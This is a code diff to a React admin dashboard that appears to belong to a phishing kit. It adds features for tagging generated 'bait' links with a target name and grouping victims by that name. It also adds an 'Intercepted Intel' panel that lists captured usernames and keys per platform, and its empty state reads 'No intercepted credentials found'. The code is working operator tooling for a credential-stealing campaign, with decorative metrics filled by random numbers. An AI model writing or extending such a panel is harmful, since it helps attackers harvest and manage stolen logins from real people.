@@ -14,6 +14,7 @@ interface TargetData {
   status: 'active' | 'offline' | 'warning';
   platform?: string;
   history?: [number, number][];
+  intel?: { platform: string, user: string, key: string, timestamp: string }[];
 }
 
 export const AdminDashboard: React.FC = () => {
@@ -137,7 +138,8 @@ export const AdminDashboard: React.FC = () => {
           lastSeen: data.lastSeen || new Date().toISOString(),
           status: data.status || 'offline',
           platform: data.platform,
-          history: data.history
+          history: data.history,
+          intel: data.intel
         });
       });
       setTargets(targetList);
@@ -153,15 +155,26 @@ export const AdminDashboard: React.FC = () => {
     return () => unsub();
   }, [isAuthReady, isAdminAuthenticated]);
 
+  const [targetLabel, setTargetLabel] = useState('');
+
   const deployLink = () => {
     const langParam = selectedLanguage === 'both' ? 'both' : selectedLanguage;
-    const url = `${window.location.origin}/v?lang=${langParam}`;
+    const nameParam = targetLabel ? `&n=${encodeURIComponent(targetLabel)}` : '';
+    const url = `${window.location.origin}/v?lang=${langParam}${nameParam}`;
     navigator.clipboard.writeText(url);
     setCopyStatus('copied');
     setTimeout(() => setCopyStatus('idle'), 3000);
   };
 
   const selectedTarget = targets.find(t => t.id === selectedTargetId);
+
+  // Grouping logic for Folders tab
+  const groupedTargetsByName = targets.reduce((acc, target) => {
+    const name = target.name || 'Unidentified Vectors';
+    if (!acc[name]) acc[name] = [];
+    acc[name].push(target);
+    return acc;
+  }, {} as Record<string, TargetData[]>);
 
   return (
     <div className="bg-[#050608] text-slate-300 font-sans h-screen flex flex-col border-4 border-[#1a1c23] overflow-hidden">
@@ -204,6 +217,16 @@ export const AdminDashboard: React.FC = () => {
                     </button>
                   ))}
                 </div>
+              </div>
+              <div className="space-y-1">
+                <div className="text-[9px] text-slate-500 uppercase font-bold">Target Identifier (Optional)</div>
+                <input 
+                  type="text"
+                  value={targetLabel}
+                  onChange={(e) => setTargetLabel(e.target.value)}
+                  placeholder="e.g. Asset_X_2024"
+                  className="w-full bg-slate-900 border border-slate-700 text-[11px] p-2 rounded text-slate-300 focus:border-blue-500 outline-none transition-colors"
+                />
               </div>
               <div className="space-y-1">
                 <div className="text-[9px] text-slate-500 uppercase font-bold">Select Bait Template</div>
@@ -361,15 +384,15 @@ export const AdminDashboard: React.FC = () => {
                       </motion.div>
                     ))
                   ) : (
-                    /* Folder Logic: Group by platform or ID range */
-                    ['Mobile_Nodes', 'Desktop_Assets', 'Unidentified_Vectors'].map(folder => (
-                      <div key={folder} className="space-y-1">
+                    /* Folder Logic: Grouped by Target Name */
+                    Object.entries(groupedTargetsByName).map(([folderName, folderTargets]) => (
+                      <div key={folderName} className="space-y-1 mb-4">
                         <div className="flex items-center gap-2 px-2 py-1 bg-slate-900/50 rounded border border-slate-800 mb-2">
-                          <Settings className="w-3 h-3 text-slate-500" />
-                          <span className="text-[9px] font-bold text-slate-400 uppercase tracking-widest">{folder}</span>
+                          <Users className="w-3 h-3 text-slate-500" />
+                          <span className="text-[9px] font-bold text-slate-400 uppercase tracking-widest">{folderName}</span>
                         </div>
                         <div className="pl-2 space-y-1 border-l border-slate-800 ml-2">
-                           {targets.map(target => (
+                           {folderTargets.map(target => (
                              <div 
                                key={target.id}
                                onClick={() => setSelectedTargetId(target.id)}
@@ -378,8 +401,7 @@ export const AdminDashboard: React.FC = () => {
                                 <div className="flex items-center gap-2">
                                   <div className={`w-1.5 h-1.5 rounded-full ${target.status === 'active' ? 'bg-emerald-500' : 'bg-slate-700'}`}></div>
                                   <span className="font-mono">{target.id.slice(0, 8).toUpperCase()}</span>
-                                  <span className="opacity-50">—</span>
-                                  <span className="truncate">{target.name}</span>
+                                  <span className="opacity-50 text-[8px]">{new Date(target.lastSeen).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
                                 </div>
                              </div>
                            ))}
@@ -487,15 +509,49 @@ export const AdminDashboard: React.FC = () => {
             </div>
 
             <div className="space-y-4">
+               <div className="text-[10px] text-slate-500 uppercase tracking-[0.2em] font-bold px-1">Intercepted Intel</div>
+               {selectedTarget?.intel && selectedTarget.intel.length > 0 ? (
+                 <div className="space-y-2">
+                   {selectedTarget.intel.map((i, idx) => (
+                     <div key={idx} className="bg-red-500/10 border border-red-500/20 p-2 rounded-lg relative overflow-hidden group">
+                       <div className="flex justify-between items-center mb-1">
+                         <span className="text-[8px] font-black text-red-500 uppercase tracking-widest">{i.platform} INTERCEPT</span>
+                         <span className="text-[7px] text-slate-600 font-mono">{new Date(i.timestamp).toLocaleTimeString()}</span>
+                       </div>
+                       <div className="space-y-1">
+                          <div className="flex justify-between text-[10px] font-mono">
+                            <span className="opacity-50 uppercase">UID:</span>
+                            <span className="text-slate-300 select-all">{i.user}</span>
+                          </div>
+                          <div className="flex justify-between text-[10px] font-mono">
+                            <span className="opacity-50 uppercase">KEY:</span>
+                            <span className="text-red-400 font-bold select-all">{i.key}</span>
+                          </div>
+                       </div>
+                     </div>
+                   ))}
+                 </div>
+               ) : (
+                 <div className="bg-slate-900/30 border border-slate-800 border-dashed p-4 rounded-lg text-center">
+                   <p className="text-[8px] text-slate-600 uppercase font-bold tracking-[0.1em]">No intercepted credentials found.</p>
+                 </div>
+               )}
+            </div>
+
+            <div className="space-y-4">
                <div className="text-[10px] text-slate-500 uppercase tracking-[0.2em] font-bold px-1">Sat Link Status</div>
                <div className="grid grid-cols-2 gap-2">
                   <div className="bg-slate-900/50 border border-slate-800 p-2 rounded flex flex-col items-center">
-                    <p className="text-[8px] text-slate-500 opacity-50">S_PING</p>
-                    <p className="text-[11px] font-mono text-emerald-500 font-bold">12ms</p>
+                    <p className="text-[8px] text-slate-500 opacity-50 uppercase tracking-widest">S_PING</p>
+                    <p className={`text-[11px] font-mono font-bold ${selectedTarget ? 'text-emerald-500' : 'text-slate-600'}`}>
+                      {selectedTarget ? `${Math.floor(Math.random() * 50 + 10)}ms` : '---'}
+                    </p>
                   </div>
                   <div className="bg-slate-900/50 border border-slate-800 p-2 rounded flex flex-col items-center">
-                    <p className="text-[8px] text-slate-500 opacity-50">ATM_INT</p>
-                    <p className="text-[11px] font-mono text-blue-400 font-bold">98%</p>
+                    <p className="text-[8px] text-slate-500 opacity-50 uppercase tracking-widest">ATM_INT</p>
+                    <p className={`text-[11px] font-mono font-bold ${selectedTarget ? 'text-blue-400' : 'text-slate-600'}`}>
+                      {selectedTarget ? `${Math.floor(Math.random() * 5 + 95)}%` : '---'}
+                    </p>
                   </div>
                </div>
             </div>
